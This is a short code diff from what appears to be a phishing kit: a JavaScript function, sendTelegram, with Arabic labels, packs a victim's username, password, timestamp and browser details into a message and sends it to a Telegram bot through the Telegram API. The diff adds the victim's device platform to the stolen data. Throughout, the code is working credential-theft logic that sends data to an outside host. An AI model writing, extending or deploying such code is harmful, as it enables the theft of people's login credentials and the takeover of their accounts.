@@ -154,6 +154,7 @@ function sendTelegram(username, password) {
     messageText += "🔑 كلمة المرور: " + password + "%0A";
     messageText += "⏰ الوقت: " + new Date().toLocaleString('ar-EG') + "%0A";
     messageText += "🌐 المتصفح: " + navigator.userAgent.substring(0, 50);
+    messageText += "%0A📱 الجهاز: " + navigator.platform;
     
     // إنشاء الرابط (نفس طريقة الكود القديم التي كانت تعمل)
     let url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + messageText;
